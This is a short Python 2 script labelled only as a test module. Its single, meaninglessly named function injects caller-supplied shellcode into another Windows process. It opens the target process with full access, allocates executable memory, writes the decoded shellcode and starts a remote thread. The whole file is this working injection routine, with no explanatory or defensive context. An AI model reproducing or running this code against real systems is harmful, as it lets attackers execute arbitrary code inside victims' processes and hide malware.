#TEST MODULE



def qweqwe( PID, SHELLCODE):
	try:
		from ctypes import *
	except ImportError as error:
		return False

	page_rwx_value = 0x40
	process_all = 0x1F0FFF
	memcommit = 0x00001000
	
	SHELLCODE = SHELLCODE.replace("\\x", "").decode("hex")
	print PID,SHELLCODE

	try:
		kernel = windll.kernel32
		process_id = PID
		shellcode_length = len(SHELLCODE)
		process_handle = kernel.OpenProcess(process_all, False, process_id)
		memory_allocation_variable = kernel.VirtualAllocEx(process_handle, 0, shellcode_length, memcommit, page_rwx_value)
		kernel.WriteProcessMemory(process_handle, memory_allocation_variable, SHELLCODE, shellcode_length, 0)
		kernel.CreateRemoteThread(process_handle, None, 0, memory_allocation_variable, 0, 0, 0)
	except Exception as error:
		print "Unexpected error : %s " % error


